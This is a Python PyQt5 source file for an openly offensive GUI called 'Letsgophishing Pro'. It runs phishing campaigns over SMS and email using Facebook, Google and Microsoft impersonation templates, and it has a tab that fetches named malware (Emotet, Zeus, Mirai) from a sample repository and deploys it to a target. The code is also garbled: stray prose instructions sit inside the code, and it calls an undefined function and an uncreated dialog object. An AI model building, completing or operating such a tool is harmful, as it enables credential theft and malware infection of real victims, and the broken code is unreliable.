import sys
from PyQt5.QtWidgets import (
    QMainWindow, QPushButton, QVBoxLayout, QWidget, QLabel, QLineEdit,
    QTextEdit, QMessageBox, QComboBox, QTabWidget, QFormLayout, QGroupBox, QFileDialog
)
Ensure that 'core' and 'malware' directories are present and properly structured in the Python path.
from core.sms_sender import send_sms
from core.email_sender import send_email
from core.proxy_config import configure_proxies
from malware.thezoo_integration import fetch_malware_sample, deploy_malware

class PhishingTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Letsgophishing Pro")
        self.setGeometry(100, 100, 800, 600)

        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)

        self.layout = QVBoxLayout()
        self.central_widget.setLayout(self.layout)

        self.tabs = QTabWidget()
        self.layout.addWidget(self.tabs)

        self.create_phishing_tab()
        self.create_malware_tab()

    def create_phishing_tab(self):
        phishing_tab = QWidget()
        phishing_layout = QVBoxLayout()

        self.title_label = QLabel("Phishing Campaign Manager")
        phishing_layout.addWidget(self.title_label)

        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("Enter target email/s, phone numbers")
        phishing_layout.addWidget(self.target_input)

        self.message_input = QTextEdit()
        self.message_input.setPlaceholderText("Enter phishing message")
        phishing_layout.addWidget(self.message_input)

        self.template_combo = QComboBox()
        self.template_combo.addItems(['Facebook', 'Google', 'Microsoft', 'Custom'])
        phishing_layout.addWidget(self.template_combo)

        self.select_custom_template_button = QPushButton("Select Custom Template")
        self.select_custom_template_button.clicked.connect(self.select_custom_template)
        phishing_layout.addWidget(self.select_custom_template_button)

        self.start_button = QPushButton("Start Campaign")
        self.start_button.clicked.connect(self.start_campaign)
        phishing_layout.addWidget(self.start_button)

        self.status_label = QLabel("Status: Idle")
        phishing_layout.addWidget(self.status_label)

        self.configure_proxies_button = QPushButton("Configure Proxies")
        self.configure_proxies_button.clicked.connect(self.configure_proxies)
        phishing_layout.addWidget(self.configure_proxies_button)

        phishing_tab.setLayout(phishing_layout)
        self.tabs.addTab(phishing_tab, "Phishing Campaign")

    def create_malware_tab(self):
        malware_tab = QWidget()
        malware_layout = QVBoxLayout()

        malware_group = QGroupBox("Malware Deployment")
        malware_form = QFormLayout()

        self.malware_combo = QComboBox()
        self.malware_combo.addItems(['Emotet', 'Zeus', 'Mirai'])  # Example malware samples
        malware_form.addRow("Select Malware:", self.malware_combo)

        self.deploy_malware_button = QPushButton("Deploy Malware")
        self.deploy_malware_button.clicked.connect(self.deploy_malware)
        malware_form.addRow(self.deploy_malware_button)

        malware_group.setLayout(malware_form)
        malware_layout.addWidget(malware_group)

        malware_tab.setLayout(malware_layout)
        self.tabs.addTab(malware_tab, "Malware Deployment")

    def start_campaign(self):
        targets = self.target_input.text()
        message = self.message_input.toPlainText()
        template = self.template_combo.currentText()
        self.status_label.setText("Status: Campaign Started")
        print(f"Targets: {targets}")
        print(f"Message: {message}")
        print(f"Template: {template}")

        start_phishing_campaign(targets, message, template)
        send_sms(targets, message)
        send_email(targets, message)

        QMessageBox.information(self, "Campaign Started", "Phishing campaign has been started successfully!")

    def configure_proxies(self):
        Provide the user with clear instructions on permissions and necessary setups for proxy configurations and malware deployment.
        QMessageBox.information(self, "Proxy Configuration", "Proxies have been configured successfully!")

    def deploy_malware(self):
        malware_name = self.malware_combo.currentText()
        target = self.target_input.text()
        try:
            malware_path = fetch_malware_sample(malware_name)
            deploy_malware(malware_path, target)
            QMessageBox.information(self, "Malware Deployment", f"Malware {malware_name} has been deployed to {target} successfully!")
        except Exception as e:
            QMessageBox.critical(self, "Error", str(e))

    def select_custom_template(self):
        options = QFileDialog.Options()
        Set a default directory for file dialog using 'file_dialog.setDirectory(QDir.homePath())'.
        file_dialog.setOptions(options)
        file_dialog.setNameFilter("HTML files (*.html)")
        file_dialog.setWindowTitle("Select Custom Template")
        if file_dialog.exec_():
            self.custom_template_path = file_dialog.selectedFiles()[0]
            QMessageBox.information(self, "Custom Template Selected", f"Custom template selected: {self.custom_template_path}")